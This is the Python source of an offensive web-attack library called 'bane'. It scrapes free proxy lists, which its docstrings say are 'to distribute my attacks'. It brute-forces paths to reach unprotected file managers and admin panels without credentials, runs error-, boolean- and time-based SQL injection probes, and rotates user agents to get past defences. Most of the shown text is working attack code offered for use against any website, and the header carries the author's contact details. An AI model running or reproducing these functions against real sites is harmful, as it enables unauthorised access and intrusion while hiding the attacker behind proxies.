#coding: utf-8
'''

email:

      trap.leader.123@gmail.com

facebook:

      https://www.facebook.com/ala.chamtouri.73

linkedin:

      https://www.linkedin.com/in/ala-bouali-bb17ab132/
'''
from payloads import *
import cgi,HTMLParser,httplib,os,sys,urllib,socket,random,time,hashlib,base64,threading,ssl,urllib2,re,smtplib,telnetlib,subprocess
from struct import *
from ftplib import FTP
'''
   checking for dependencies and installing the missing ones
'''
try:
  import pexpect
  from pexpect import pxssh
except:
  os.system('pip install pexpect')
  import pexpect
try:
 import paramiko
 from paramiko import SSHClient, AutoAddPolicy
except:
  os.system('pip install paramiko')
  import paramiko
  from paramiko import SSHClient, AutoAddPolicy
try:
  import socks
except:
   os.system('pip install PySocks')
   import socks
try:
  import requests
except:
 os.system('pip install requests')
 import requests
try:
  import bs4
  from bs4 import BeautifulSoup
except:
  os.system('pip install bs4')
  import bs4
  from bs4 import BeautifulSoup
try:
  from scapy.all import *
except:
  os.system('pip install scapy')
  from scapy.all import *
try:
  import stem
  from stem import Signal
  from stem.control import Controller
except:
  os.system('pip install stem')
  import stem
  from stem import Signal
  from stem.control import Controller
try:
 import mysql.connector as mconn
except:
  os.system('pip install mysql-connector')
  import mysql.connector as mconn
def masshttp(*args):
 '''
   this function gather up thousands of HTTP / HTTPS proxies from www.proxyserverlist24.top and proxy-daily.com
   those proxies are not recommended to be used as reliable ones all the time, i use them here just to distribute my attacks
   on next functions...
   if you are willing to use them please check them first!!!
   the function takes an argument (*args) which is the number of proxies to return, in case of no argument given it will
   return the whole list.

   usage:

   >>>import bane
   >>>bane.masshttp()

   >>>bane.masshttp(1500)
 '''
 if args:
  m=args[0]
 else:
  m=999999
 u="http://www.proxyserverlist24.top/"
 t=[]
 l=[]
 h=[]
 try:
  r=requests.get(u).text
  soup= BeautifulSoup ( r, 'html.parser')
  h3tags = soup.findAll('a')
  for a in h3tags:
    try:
     if (a.has_attr('href') and (u in str(a)) and ("proxy-server" in str(a)) and("#" not in (str(a)))) :
      try:
       a=str(a)
       a=a.split('href="')[1]
       a=a.split('"')[0]
       if (a not in l):
          l.append(a)
      except Exception as xx:
       pass
    except Exception as ex:
     pass
     continue
 except Exception as e:
  pass
 for u in l:
  try:
   a=requests.get(u,timeout=5)
   ips = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})",a.text)
   t+=ips
  except Exception as e:
   pass
  u="http://proxy-daily.com/"
  try:
   r=requests.get(u).text
   soup= BeautifulSoup ( r, 'html.parser')
   l = soup.findAll('div')
  except:
   pass
  p=[]
  ips=[]
  for x in l:
   try:
    ips = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})",str(x))
    if (ips) and (ips not in p):
     p.append(ips)
   except:
    pass
 try:
  t+=p[0]
 except:
  pass
 if args:
  while True:
   o=random.choice(t)
   h.append(o)
   if (len(h)==m) or (len(h)==len(t)):
    break
 else:
  h=t
 return h
def massocks4(*args):
 '''
   this function gather up thousands of SOCKS4 proxies from www.proxyserverlist24.top and proxy-daily.com
   those proxies are not recommended to be used as reliable ones all the time, i use them here just to distribute my attacks
   on next functions...
   if you are willing to use them please check them first!!!
   the function takes an argument (*args) which is the number of proxies to return, in case of no argument given it will
   return the whole list.

   usage:

   >>>import bane
   >>>bane.massocks4()

   >>>bane.massocks4(100)
 '''
 if args:
  m=args[0]
 else:
  m=999999
 s4=[]
 l=[]
 u="http://proxy-daily.com/"
 try:
   r=requests.get(u).text
   soup= BeautifulSoup ( r, 'html.parser')
   l = soup.findAll('div')
 except Exception as e:
   pass
 p=[]
 for x in l:
   try:
    ips = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})",str(x))
    if (ips) and (ips not in p):
     p.append(ips)
   except Exception as x:
    pass
 t=p[2]
 if args:
  while True:
   o=random.choice(t)
   s4.append(o)
   if (len(s4)==m) or (len(s4)==len(t)):
    break
 else:
  s4=t
 return s4
def massocks5(*args):
 '''
   this function gather up thousands of SOCKS5 proxies from www.proxyserverlist24.top and proxy-daily.com
   those proxies are not recommended to be used as reliable ones all the time, i use them here just to distribute my attacks
   on next functions...
   if you are willing to use them please check them first!!!
   the function takes an argument which is the number of proxies to return (*args) , in case of no argument given it will
   return the whole list.

   usage:

   >>>import bane
   >>>bane.massocks5()

   >>>bane.massocks5(500)
 '''
 if args:
  m=args[0]
 else:
  m=999999
 u="http://www.live-socks.net/"
 t=[]
 l=[]
 s5=[]
 try:
  r=requests.get(u).text
  soup= BeautifulSoup ( r, 'html.parser')
  h3 = soup.find_all( 'h3',class_='post-title entry-title' )
  for ha in h3:
   h3tags = ha.find_all('a')
   for a in h3tags:
    try:
     a=str(a)
     if("socks-5-servers" in a):
       a=a.split('href="')[1]
       a=a.split('"')[0]
       if (a not in l):
          l.append(a)
    except Exception as ex:
     continue
 except Exception as e:
  pass
 for u in l:
  try:
   a=requests.get(u,timeout=5)
   ips = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})",a.text)
   for x in ips:
    if (x not in t):
     t.append(x)
  except Exception as e:
   pass
 if args:
  while True:
   o=random.choice(t)
   s5.append(o)
   if (len(s5)==m) or (len(s5)==len(t)):
    break
 else:
  s5=t
 return s5
def http(logs=True,count=300):
 '''
   this function gather up hundreds of HTTP proxies from many sources.
   those proxies are recommended to be used as reliable ones all the time.
   the function takes an argument which is the number of proxies to return (*args) , in case of no argument given it will
   return the whole list,and another argument (logs) which is set by default to True so you can see the process of the function, you can turn 
   off the the typing if you set it to: False.

   usage:

   >>>import bane
   >>>bane.http()

   >>>bane.http(300)
'''
 hsl=[]
 u="https://free-proxy-list.net/"
 try:
  if logs==True:
   print"[+]Checking:",u
  c=requests.get(u).text
  a=0
  soup = BeautifulSoup(c,"html.parser")
  y=soup.find_all('tr')
  for x in y:
   try:
    a+=1
    x=str(x)
    ip=x.split('<tr><td>')[1].split('=')[0]
    ip=ip.split('</td>')[0].split('=')[0]
    p=x.split('</td><td>')[1].split('=')[0]
    p=p.split('</td>')[0].split('=')[0]
    pr=ip+':'+p
    if pr not in hsl:
     hsl.append(pr)
     if (a>300) or (len(hsl)==count):
      break
   except Exception as e:
    pass
 except Exception as e:
  pass
 for i in range(1,7):
  if len(hsl)==count:
    break
  try:
   u='https://list.proxylistplus.com/Fresh-HTTP-Proxy-List-'+str(i)
   if logs==True:
    print"[+]Checking:",u
   c=requests.get(u).text
   soup = BeautifulSoup(c,"html.parser")
   y= soup.find_all("tr")
   for x in y:
    try:
     z = x.find_all('td')
     if "strong" in str(z):
       pass 
     else:
      ip= str(z[1]).split('<td>')[1].split('=')[0]
      ip=ip.split('</td>')[0].split('=')[0]
      p= str(z[2]).split('<td>')[1].split('=')[0]
      p=p.split('</td>')[0].split('=')[0]
      pr=ip+':'+p
      if pr not in hsl:
       hsl.append(pr)
       if len(hsl)==count:
         break
    except Exception as e:
     pass
  except Exception as e:
   pass
 ur=["http://www.gatherproxy.com/proxylist/anonymity/?t=Elite","http://www.gatherproxy.com/proxylist/anonymity/?t=Anonymous"]
 for u in ur:
  if len(hsl)==count:
    break
  try:
   if logs==True:
    print "[+]Checking:",u
   y=[]
   c=requests.get(u).text
   soup = BeautifulSoup(c,"html.parser")
   for r in soup.find_all("script"):
    h= ''.join(map(str, r.contents))
    if 'gp.insertPrx' in h:
     s = h.split(":")
     ip= s[3].split(",")[0].replace('\"','')
     p = str(int(s[5].split(",")[0].replace('\"',''), 16))
     pr=ip+':'+p
     if pr not in hsl:
       hsl.append(pr)
       if len(hsl)==count:
        break
  except Exception as e:
   pass
 return hsl
def https(logs=True,count=200):
 '''
   this function gather up hundreds of HTTPS proxies from many sources.
   those proxies are recommended to be used as reliable ones all the time.
   the function takes an argument which is the number of proxies to return (*args) , in case of no argument given it will
   return the whole list,and another argument (logs) which is set by default to True so you can see the process of the function, you can turn 
   off the the typing if you set it to: False.

   usage:

   >>>import bane
   >>>bane.https()

   >>>bane.https(200)   

'''
 hl=[]
 u='https://www.sslproxies.org/'
 try:
  if logs==True:
   print"[+]Checking:",u
  c=requests.get(u).text
  soup = BeautifulSoup(c,"html.parser")
  y= soup.find_all("tr")
  a=0
  for x in y:
   try:
    x=str(x)
    ip=x.split('</td>')[0].split('=')[0]
    ip=ip.split('<tr><td>')[1].split('=')[0]
    p=x.split('</td><td>')[1].split('=')[0]
    p=p.split('</td>')[0].split('=')[0]
    pr=ip+':'+p
    a+=1
    if pr not in hl:
     hl.append(pr)
     if (a==100) or (len(hl)==count):
      a=0
      break
   except:
    pass
 except:
  pass
 ur=['https://list.proxylistplus.com/ssl-List-1', 'https://list.proxylistplus.com/ssl-List-2']
 for u in ur:
  if len(hl)==count:
    break
  try:
   if logs==True:
    print"[+]Checking:",u
   c=requests.get(u).text
   soup = BeautifulSoup(c,"html.parser")
   y= soup.find_all("tr")
   for x in y:
    try:
     z = x.find_all('td')
     if "strong" in str(z):
      pass 
     else:
       ip= str(z[1]).split('<td>')[1].split('=')[0]
       ip=ip.split('</td>')[0].split('=')[0]
       p= str(z[2]).split('<td>')[1].split('=')[0]
       p=p.split('</td>')[0].split('=')[0]
       pr=ip+':'+p
       if pr not in hl:
        hl.append(pr)
        if len(hl)==count:
          break
    except Exception as e:
     pass
  except Exception as e:
   pass
 return hl
def socks5(logs=True,count=100):
 '''
   this function gather up hundreds of SOCKS5 proxies from many sources.
   those proxies are recommended to be used as reliable ones all the time.
   the function takes an argument which is the number of proxies to return (*args) , in case of no argument given it will
   return the whole list,and another argument (logs) which is set by default to True so you can see the process of the function, you can turn 
   off the the typing if you set it to: False.

   usage:

   >>>import bane
   >>>bane.socks5()

   >>>bane.socks5(50)
'''
 s5l=[]
 u='https://www.socks-proxy.net/'
 try:
  if logs==True:
   print"[+]Checking:",u
  c=requests.get(u).text
  soup = BeautifulSoup(c,"html.parser")
  y= soup.find_all("tr")
  for x in y:
   if "Socks5" in str(x):
    try:
     x=str(x)
     ip=x.split('</td>')[0].split('=')[0]
     ip=ip.split('<tr><td>')[1].split('=')[0]
     p=x.split('</td><td>')[1].split('=')[0]
     p=p.split('</td>')[0].split('=')[0]
     pr=ip+':'+p
     if pr not in s5l:
      s5l.append(pr)
      if len(s5l)==count:
        break
    except:
     pass
 except:
   pass
 ur=["https://list.proxylistplus.com/Socks-List-1"," https://list.proxylistplus.com/Socks-List-2"]
 for u in ur:
  if len(s5l)==count:
   break
  try:
   if logs==True:
    print"[+]Checking:",u
   c=requests.get(u).text
   s = BeautifulSoup(c,"html.parser")
   y=s.find_all('tr')
   for x in y:
    try:
     z = x.find_all('td')
     if "strong" in str(z):
      pass 
     else:
      if "Socks5" in str(x):
       ip= str(z[1]).split('<td>')[1].split('=')[0]
       ip=ip.split('</td>')[0].split('=')[0]
       p= str(z[2]).split('<td>')[1].split('=')[0]
       p=p.split('</td>')[0].split('=')[0]
       pr=ip+':'+p
       if pr not in s5l:
        s5l.append(pr)
        if len(s5l)==count:
          break
    except Exception as e:
     pass
  except Exception as e:
   pass
 return s5l
def socks4(logs=True,count=30):
 '''
   this function gather up hundreds of SOCKS4 proxies from many sources.
   those proxies are recommended to be used as reliable ones all the time.
   the function takes an argument which is the number of proxies to return (*args) , in case of no argument given it will
   return the whole list,and another argument (logs) which is set by default to True so you can see the process of the function, you can turn 
   off the the typing if you set it to: False.

   usage:

   >>>import bane
   >>>bane.socks4()

   >>>bane.socks4(50)
'''
 s4l=[]
 u='https://www.socks-proxy.net/'
 try:
  if logs==True:
   print"[+]Checking:",u
  c=requests.get(u).text
  soup = BeautifulSoup(c,"html.parser")
  y= soup.find_all("tr")
  for x in y:
   if "Socks4" in str(x):
    try:
     x=str(x)
     ip=x.split('</td>')[0].split('=')[0]
     ip=ip.split('<tr><td>')[1].split('=')[0]
     p=x.split('</td><td>')[1].split('=')[0]
     p=p.split('</td>')[0].split('=')[0]
     pr=ip+':'+p
     if pr not in s4l:
      s4l.append(pr)
      if len(s4l)==count:
       break
    except Exception as e:
     pass
 except Exception as e:
  pass
 ur=["https://list.proxylistplus.com/Socks-List-1"," https://list.proxylistplus.com/Socks-List-2"]
 for u in ur:
  if len(s4l)==count:
   break
  try:
   if logs==True:
    print"[+]Checking:",u
   c=requests.get(u).text
   s = BeautifulSoup(c,"html.parser")
   y=s.find_all('tr')
   for x in y:
    try:
     z = x.find_all('td')
     if "strong" in str(z):
      pass 
     else:
      if "Socks4" in str(x):
       ip= str(z[1]).split('<td>')[1].split('=')[0]
       ip=ip.split('</td>')[0].split('=')[0]
       p= str(z[2]).split('<td>')[1].split('=')[0]
       p=p.split('</td>')[0].split('=')[0]
       pr=ip+':'+p
       if pr not in s4l:
        s4l.append(pr)
        if len(s4l)==count:
          break
    except Exception as e:
     pass
  except Exception as e:
   pass
 return s4l
def proxy_check(ip,p,proto='http',timeout=5):
 '''
    this function is to check if the proxy is dead or not.

    it takes the following arguments:
    
    proto: (set by default to: http) the proxy type: http/https/socks4/socks5
    ip: proxy's ip
    p: proxy's port
    timeout: (set by default to: 5) the connection's timeout

'''
 i=0
 if (proto=='http') or (proto=='https'):
  try:
   requests.get("http://www.google.com",proxies={proto:'http://'+ip+':'+p},timeout=timeout)
   i+=1
  except:
   pass
 elif proto=='socks4':
  try:
   s =socks.socksocket()
   s.setproxy(socks.PROXY_TYPE_SOCKS4, ip, p, True)
   s.settimeout(timeout)
   s.connect(('www.google.com',80))
   i+=1
  except:
   pass
 elif proto=='socks5':
  try:
   s =socks.socksocket()
   s.setproxy(socks.PROXY_TYPE_SOCKS5, ip, p, True)
   s.settimeout(timeout)
   s.connect(('www.google.com',80))
   i+=1
  except:
   pass
 return i
"""
   in all functions below you can use a proxy in any function that takes the 'proxy' parameter with the same way that requests module does:
  
   example:

   proxy={'http': 'http://xx.xxx.xx.xxx:80'}
  
   please note that if you are going to use socks proxies you will have to install: requests[socks]

"""
def filemanager(u,logs=True,mapping=False,returning=False,timeout=10,proxy={}):
 '''
   if you are lucky and smart enough, using google dorking you can gain an unauthorised access to private file managers and manipulate files
   (delete, upload, edit...) and exploit this weakness on the security of the target for further purposes.
   this funtion try to gain access to any giving website's filemanager by bruteforcing the links (list called "filemanager") and trying to get
   200 ok response directly without redirectes which indicates in most of the cases to an unprotected accessebleb filemanager.

   the function takes the following arguments:

   u: the link: http://www.example.com
   logs: (set by default to True) the show the process and requests
   mapping: (set by default to: False) if it is set to True, it will stop the prcess when it finds the link, else: it continue for more
   possible links
   returning: (set by default to: False) if you want it to return a list of possibly accesseble links to be used in your scripts set it to: True
   timeout: (set by default to 10) timeout flag for the requests   

   usage:

   >>>import bane
   >>>url='http://www.example.com/'
   >>>bane.filemanager(url)
   >>>bane.filemanager(url,returning=True,mapping=False)
'''
 k=[]
 for i in manager:
  try:
   if u[len(u)-1]=='/':
    u=u[0:len(u)-1]
   g=u+i
   if logs==True:
    print'[*]Trying:',g
   r=requests.get(g,  headers = {'User-Agent': random.choice(ua)} , allow_redirects=False,proxies=proxy,timeout=timeout) 
   if r.status_code == requests.codes.ok:
    if (("Uncaught exception" not in r.text) or ("404 Not Found" not in r.text)):
     if logs==True:
      print'[+]FOUND!!!'
      k.append(g)
     if mapping==False:
      break
    else:
     if logs==True:
      print'[-]Failed'
   else:
    if logs==True:
     print'[-]Failed'
  except KeyboardInterrupt:
   break
  except Exception as e:
   pass
 if returning==True:
  return k
def crawl(u,timeout=10,bypass=False,proxy={}):
 '''
   this function is used to crawl any given link and returns a list of all available links on that webpage with ability to bypass anti-crawlers
   
   the function takes those arguments:
   
   u: the targeted link
   timeout: (set by default to 10) timeout flag for the request
   bypass: (set by default to False) option to bypass anti-crawlers by simply adding "#" to the end of the link :)

   usage:

   >>>import bane
   >>>url='http://www.example.com'
   >>>bane.crawl(url)
   
   >>>bane.crawl(url,bypass=True)
'''
 h=[]
 if bypass==True:
  u+='#'
 try:
  c=requests.get(u, headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
  soup = BeautifulSoup(c,"html.parser")
  u=u.split(u.split("/")[3])[0]
  u=u[0:len(u)-1]
  for a in soup.find_all('a'):
   if a.has_attr('href'):
    try:
     a=str(a)
     a=a.split('href="')[1].split('"')[0]
     a=a.split('"')[0].split('"')[0]
     if ("://" not in a) and ('.'not in a):
      if a[0]=="/":
       a=a[1:len(a)]
      a=u+'/'+a
     if (a not in h) and (u in a):
      if (a!=u+"/") and (a!=u):
       h.append(a)
    except Exception as e:
     pass
 except:
  pass
 return h
def pather(u,timeout=10,bypass=False,proxy={}):
 '''
   this function is similar to the "crawl" function except that it returns only the paths not the full URL.
   
   the function takes those arguments:
   
   u: the targeted link
   timeout: (set by default to 10) timeout flag for the request
   bypass: (set by default to False) option to bypass anti-crawlers by simply adding "#" to the end of the link :)

   usage:

   >>>import bane
   >>>url='http://www.example.com'
   >>>bane.pather(url)
   
   >>>bane.pather(url,bypass=True)
'''
 h=[]
 p=[]
 if bypass==True:
  u+='#'
 try:
  c=requests.get(u, headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
  soup = BeautifulSoup(c,"html.parser")
  u=u.split(u.split("/")[3])[0]
  u=u[0:len(u)-1]
  for a in soup.find_all('a'):
   if a.has_attr('href'):
    try:
     a=str(a)
     a=a.split('href="')[1].split('"')[0]
     a=a.split('"')[0].split('"')[0]
     if ("://" not in a) and ('.' not in a):
      if a[0]=="/":
       a=a[1:len(a)]
      a=u+'/'+a
     if (a not in h) and (u in a):
      if (a!=u+"/") and (a!=u):
       h.append(a)
    except Exception as e:
     pass
 except:
  pass
 for x in h:
  p.append(x.split(u)[1])
 return p
def media(u,timeout=10,bypass=False,proxy={}):
 '''
   this funtion was made to collect the social media links related to the targeted link (facebook, twitter, instagram...).

   the function takes those arguments:
   
   u: the targeted link
   timeout: (set by default to 10) timeout flag for the request
   bypass: (set by default to False) option to bypass anti-crawlers by simply adding "#" to the end of the link :)

   usage:

   >>>import bane
   >>>url='http://www.example.com'
   >>>bane.media(url)
   
   >>>bane.media(url,bypass=True)
'''
 h=[]
 try:
  if bypass==True:
   u+='#'
  c=requests.get(u,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
  soup = BeautifulSoup(c,"html.parser")
  ul=u.split('://')[1].split('"')[0]
  ur=ul.replace("www.",'') 
  for a in soup.findAll('a'):
   try:
    if a.has_attr('href') and (u not in str(a)) and (ur not in str(a)):
     a=str(a)
     a=a.split('href="h')[1].split('"')[0]
     a=a.split('"')[0].split('"')[0]
     a='h'+a
     if a not in h:
      h.append(a)
   except:
    pass
 except:
  pass
 return h
def subdomains(u,timeout=10,bypass=False,proxy={}):
 '''
   this function collects the subdomains found on the targeted webpage.

   the function takes those arguments:
   
   u: the targeted link
   timeout: (set by default to 10) timeout flag for the request
   bypass: (set by default to False) option to bypass anti-crawlers by simply adding "#" to the end of the link :)

   usage:

   >>>import bane
   >>>url='http://www.example.com'
   >>>bane.subdomains(url)
   
   >>>bane.subdomains(url,bypass=True)
'''
 h=[]
 try:
  if bypass==True:
   u+='#'
  c=requests.get(u, headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
  ul=u.split('://')[1].split('"')[0]
  soup = BeautifulSoup(c,"html.parser")
  for a in soup.findAll('a'):
   if a.has_attr('href') and (ul.replace("www",'') in str(a)) and (u not in str(a)):
    a=str(a)
    try:
     a=a.split('://')[1].split('"')[0]
     a=a.split('/')[0].split('"')[0]
     if a not in h:
      h.append(a)
    except Exception as e:
     pass
 except:
  pass
 return h
def access(u,timeout=10,bypass=False,proxy={}):
 '''
   this function isused to check if the given link is returning 200 ok response or not.
   
   the function takes those arguments:
   
   u: the targeted link
   timeout: (set by default to 10) timeout flag for the request
   bypass: (set by default to False) option to bypass anti-crawlers by simply adding "#" to the end of the link :)

   usage:

   >>>import bane
   >>>url='http://www.example.com/admin/'
   >>>url+='edit.php'
   >>>a=bane.access(url)
   >>>if a==1:
   ... print 'accessable'
 '''
 if bypass==True:
   u+='#'
 try:
   s=0
   r=requests.get(u,  headers = {'User-Agent': random.choice(ua)} , allow_redirects=False,proxies=proxy,timeout=timeout) 
   if r.status_code == requests.codes.ok:
    if (("Uncaught exception" not in r.text) or ("404 Not Found" not in r.text)):
     s+=1
 except Exception as e:
   pass
 return s
def forcebrowsing(u,timeout=10,logs=True,returning=False,mapping=True,ext='php',proxy={}):
 '''
   this function is using "Forced Browsing" technique which is aim to access restricted areas without providing any credentials!!!
   it is used here to gain access to admin control panel by trying different possible combinations of links with the given URL.
   it's possible to do that and this a proof of concept that unserured cpanels with lack of right sessions configurations can be
   accessed just by guessing the right links :)

   the function takes those arguments:
   
   u: the targeted link which should be leading to the control panel, example:
   http://www.example.com/admin/login.php
   you have to delete 'login.php' and insert the rest of the link in the function like this:
   
   >>>import bane
   >>>bane.forcebrowsing('http://www.example.com/admin/')

   then the function will try to find possible accesseble links:

   http://www.example.com/admin/edit.php
   http://www.example.com/admin/news.php
   http://www.example.com/admin/home.php

   timeout: (set by default to 10) timeout flag for the request
   logs: (set by default to: True) showing the process of the attack, you can turn it off by setting it to: False
   returning: (set by default to: False) return a list of the accessible link(s), to make the function return the list, set to: True
   mapping: (set by default to: True) find all possible links, to make stop if it has found 1 link just set it to: False
   ext: (set by default to: "php") it helps you to find links with the given extention, cuurentky it supports only 3 extentions: "php", "asp"
   and "aspx"( any other extention won't be used).  
'''
 l=[]
 if u[len(u)-1]=='/':
    u=u[0:len(u)-1]
 for x in innerl:
  g=u+x+'.'+ext
  if logs==True:
   print'[*]Trying:',g
  try:
   h=access(g,proxy=proxy)
  except KeyboardInterrupt:
   break
  if h==1:
   l.append(g)
   if logs==True:
    print'[+]FOUND!!!'
   if mapping==False:
    break
  else:
   if logs==True:
    print'[-]Failed'
 if returning==True:
  return l
def dnstableip(u,timeout=10,proxy={}):
 '''
   this fuctions is to make a requests to dnstable.com and get all informations about a given ip, then return the response body to the user.

   it takes the following arguments:
   
   u: the ip
   timeout: (set by default to: 10) the timeout flag for the request

   usage:

   >>>import bane
   >>>ip='50.63.33.34'
   >>>bane.dnstableip(ip)
'''
 r=''
 if '://' in u:
  u=u.split('://')[1].split('/')[0]
 u='https://dnstable.com/ip/'+u
 try:
  r=requests.get(u,proxies=proxy,timeout=timeout).text
 except:
  pass
 return r
def headerstest(u,timeout=10,proxy={}):
 '''
   this fuctions is to make a requests to securityheaders.com and get a report about http headers of  a given domain then return the response 
   body to the user.

   it takes the following arguments:
   
   u: the ip
   timeout: (set by default to: 10) the timeout flag for the request

   usage:

   >>>import bane
   >>>domain='www.google.com'
   >>>bane.headerstest(domain)
'''
 r=''
 if '://' in u:
  u=u.split('://')[1].split('/')[0]
 u='https://securityheaders.com/?q='+u+'&followRedirects=on'
 try:
  r=requests.get(u,proxies=proxy,timeout=timeout).text
 except:
  pass
 return r
def dnstabledomain(u,timeout=10,proxy={}):
 '''
   this fuctions is to make a requests to dnstable.com and get all informations about a given domain, then return the response body to the
   user.

   it takes the following arguments:
   
   u: the domain
   timeout: (set by default to: 10) the timeout flag for the request

   usage:

   >>>import bane
   >>>domain='www.google.com'
   >>>bane.dnstabledomain(domain)
'''
 r=''
 if '://' in u:
  u=u.split('://')[1].split('/')[0]
 u='https://dnstable.com/domain/'+u
 try:
  r=requests.get(u,proxies=proxy,timeout=timeout).text
 except:
  pass
 return r
def info(u,timeout=10,proxy={}):
 '''
   this function fetchs all informations about the given ip or domain using check-host.net and returns them to the use as a list of strings
   with this format:

   'requested information: result'
    
   it takes 2 arguments:
   
   u: ip or domain
   timeout: (set by default to: 10) timeout flag for the request

   usage:

   >>>import bane
   >>>domain='www.google.com'
   >>>bane.info(domain)
'''
 try:
  h=[]
  u='https://check-host.net/ip-info?host='+u
  c=requests.get(u, headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
  soup = BeautifulSoup(c,"html.parser")
  d=soup.find_all("tr")
  for a in d:
   try:
    b=str(a)
    if "IP address" not in b:
     a=b.split('<td>')[1].split('!')[0]
     a=a.split('</td>')[0].split('!')[0]
     c=b.split('<td>')[2].split('!')[0]
     c=c.split('</td>')[0].split('!')[0]
     if "strong" in c:
      for n in ['</strong>','<strong>']:
       c=c.replace(n,"")
     if "<a" in c:
      c=c.split('<a')[0].split('!')[0]
      c=c.split('</a>')[0].split('!')[0]
     if "<img" in c:
      c=c.split('<img')[1].split('!')[0]
      c=c.split('/>')[1].split('!')[0]
     n=a.strip()+': '+c.strip()
     h.append(n)
   except Exception as e:
    pass
 except Exception as e:
  pass
 return h
def upordown(ur,logs=True,returning=False,timeout=10,proxy={}):
 '''
   this funtion checks the given ip or domain if it is up or down using 2 validation sources:
   down.com and downforeveryoneorjustme.com

   it takes 3 arguments:
  
   ur: ip or domain
   logs: (set by default to: True) showing the process, you can turn it off by setting it to:False
   returning: (set by default to: False) returnin interger indicating the up or down score.
   
   usage:

   >>>import bane
   >>>domain='www.google.com'
   >>>bane.upordown(domain)
   
   0 => target semms down for both
   1 => target seems up for one of them
   2 => target seems up for both
'''
 s=0
 if "://" in ur:
  ur=ur.split('://')[1].split('=')[0]
  if '/' in ur:
   ur=ur.split('/')[0].split('=')[0]
 try:
  if logs==True:
   print'[*]Testing with: down.com'
  u='https://down.com/?q='+ur
  c=requests.get(u,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
  soup = BeautifulSoup(c,"html.parser")
  for a in soup.findAll('strong'):
   if "Down" in str(a):
    if logs==True:
     print'[-]Down'
   else:
    if logs==True:
     print'[+]Up'
    s+=1
 except:
  pass
 u='https://downforeveryoneorjustme.com/'+ur
 try:
  if logs==True:
   print'[*]Testing with: downforeveryoneorjustme.com'
  c=requests.get(u,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
  soup = BeautifulSoup(c,"html.parser")
  for a in soup.findAll('p'):
   if ('class="domain"' in str(a)):
    if "Down" in str(a):
     if logs==True:
      print'[-]Down'
    else:
     s+=1
     if logs==True:
      print'[+]Up'
 except:
  pass 
 if returning==True:
  return s
def nortonrate(u,logs=True,returning=False,timeout=15,proxy={}):
 '''
   this function takes any giving and gives a security report from: safeweb.norton.com, if it is a: spam domain, contains a malware...

   it takes 3 arguments:

   u: the link to check
   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning the report as a string format if it is set to: True.

   usage:

   >>>import bane
   >>>url='http://www.example.com'
   >>>bane.nortonrate(domain)
'''
 s=""
 try:
  if logs==True:
   print'[*]Testing link with safeweb.norton.com'
  ur=urllib.quote(u, safe='')
  ul='https://safeweb.norton.com/report/show?url='+ur
  c=requests.get(ul, headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text 
  soup = BeautifulSoup(c, "html.parser").text
  s=soup.split("Summary")[1].split('=')[0]
  s=s.split("The Norton rating")[0].split('=')[0]
  if logs==True:
   print'[+]Report:\n',s.strip()
 except:
  pass
 if returning==True:
  return s.strip()
def sqlieb(u,logs=True,returning=False,timeout=10,proxy={}):
 '''
   this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding "'" at the end of the line and
   check the response body for any SQL syntax errors.
   it's an "Error Based SQL Injection" test.

   the function takes 4 arguments:

   u: the link to check
   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning an integer indecating the result of the test:
   
   usage:

   >>>import bane
   >>>l='http://www.example.com/product.php?id=2'
   >>>bane.sqlieb(domain)
   
   if returning was set to: True
   0 => not vulnerable
   1 => vulnerable

   timeout: (set by default to: 10) timeout flag for the request
'''
 s=0
 if logs==True:
  print'[*]Error Based SQL Injection test'
 try:
  u+="'"
  rp= requests.get(u,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  r=rp.text
  if (('SQL command not properly ended' in r) or ('Query failed: ERROR: syntax error at or near' in r) or ('Unclosed quotation mark before the character string' in r) or ("You have an error in your SQL syntax" in r) or ("quoted string not properly terminated" in r) or ("mysql_fetch_array(): supplied argument is not a valid MySQL result resource in"in r)):
   s+=1
 except Exception as e:
  pass
 if logs==True:
  if s==0:
   print'[-]Not vulnerable'
  if s==1:
   print'[+]Vulnerable!!!'
 if returning==True:
  return s
def sqlibb(u,logs=True,returning=False,timeout=10,proxy={}):
 '''
   this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding boolean opertations to the link
   and check the response body for any change.
   it's an "Boolean Based SQL Injection" test.

   the function takes 4 arguments:

   u: the link to check
   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning an integer indecating the result of the test:
   
   usage:

   >>>import bane
   >>>l='http://www.example.com/product.php?id=2'
   >>>bane.sqlibb(domain)
   
   if returning was set to: True
   0 => not vulnerable
   1 => vulnerable

   timeout: (set by default to: 10) timeout flag for the request
'''
 s=0
 try:
  if logs==True:
   print'[*]Boolean Based SQL Injection test'
  r=requests.get(u+"+and+1=2",proxies=proxy,timeout=timeout)
  q=requests.get(u+"+and+1=1",proxies=proxy,timeout=timeout)
  if ((r.status_code==200)and(q.status_code==200)):
   if r.text!=q.text:
    s+=1
 except:
  pass
 if logs==True:
  if s==0:
   print'[-]Not vulnerable'
  if s==1:
   print'[+]Vulnerable!!!'
 if returning==True:
  return s
def sqlitb(u,delay=15,logs=True,returning=False,timeout=25,proxy={}):
 '''
   this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding a delay statement at the end
   of the line and check the delay of the response.
   it's an "Time Based SQL Injection" test.

